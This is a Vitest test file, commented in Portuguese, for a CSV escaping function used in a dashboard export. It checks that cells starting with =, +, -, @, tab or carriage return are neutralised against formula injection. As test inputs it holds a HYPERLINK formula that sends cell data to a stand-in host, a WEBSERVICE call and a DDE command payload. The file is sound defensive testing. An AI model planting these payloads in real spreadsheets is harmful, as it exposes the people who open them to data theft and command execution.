import { describe, expect, it } from 'vitest'
import { campoCsv } from '@/lib/csv'

/**
 * Os CSV do painel levam texto que qualquer pessoa digitou no celular, na tela
 * de voto — a observação e o nome de quem atendeu — e vão ser abertos no Excel
 * por alguém da ACIA.
 *
 * **O risco não é quebrar a planilha: é ela executar o texto.** Célula que
 * começa com `=`, `+`, `-`, `@`, tabulação ou retorno de carro é lida como
 * fórmula pelo Excel, pelo LibreOffice e pelo Google Sheets.
 *
 * Errar aqui não gera erro em lugar nenhum: gera uma planilha que faz uma
 * requisição para fora quando a ACIA abre o arquivo.
 */

describe('injeção de fórmula', () => {
  const perigosos = ['=', '+', '-', '@', '\t', '\r']

  it.each(perigosos)('neutraliza campo começando com %j', (inicio) => {
    const saida = campoCsv(`${inicio}SOMA(1+1)`)
    // A aspa simples é o que diz "isto é texto" às três planilhas.
    expect(saida.replace(/^"/, '').startsWith("'")).toBe(true)
  })

  it('o ataque clássico de exfiltração vira texto', () => {
    const ataque = '=HYPERLINK("https://site-falso/?"&A1,"Resultado")'
    const saida = campoCsv(ataque)
    expect(saida).toBe(`"'=HYPERLINK(""https://site-falso/?""&A1,""Resultado"")"`)
    // O que importa: o conteúdo não começa mais por `=`.
    expect(saida.replace(/^"/, '').startsWith('=')).toBe(false)
  })

  it('WEBSERVICE, que o Sheets busca sozinho, também é neutralizado', () => {
    expect(campoCsv('=WEBSERVICE("https://site-falso/")').includes(`"'=`)).toBe(true)
  })

  it('DDE com pipe não escapa', () => {
    expect(campoCsv("+cmd|' /C calc'!A0").startsWith("'")).toBe(true)
  })
})

describe('o escape de CSV continua valendo', () => {
  it('texto comum passa intacto', () => {
    expect(campoCsv('Muito bom, voltarei')).toBe('Muito bom, voltarei')
  })

  it('ponto e vírgula obriga aspas — é o separador no Excel brasileiro', () => {
    expect(campoCsv('bom; mas demorou')).toBe('"bom; mas demorou"')
  })

  it('aspas internas são duplicadas', () => {
    expect(campoCsv('ele disse "ótimo"')).toBe('"ele disse ""ótimo"""')
  })

  it('quebra de linha não parte a linha do arquivo', () => {
    expect(campoCsv('linha um\nlinha dois')).toBe('"linha um\nlinha dois"')
  })

  it('nulo e indefinido viram célula vazia, não "null"', () => {
    expect(campoCsv(null)).toBe('')
    expect(campoCsv(undefined)).toBe('')
  })

  it('a aspa simples entra no conteúdo, nunca no delimitador', () => {
    // Se o prefixo fosse posto depois do escape, sairia `'"..."` e a planilha
    // leria a aspa simples como parte do delimitador, não do texto.
    const saida = campoCsv('=a;b')
    expect(saida).toBe(`"'=a;b"`)
    expect(saida.startsWith(`"'`)).toBe(true)
  })
})
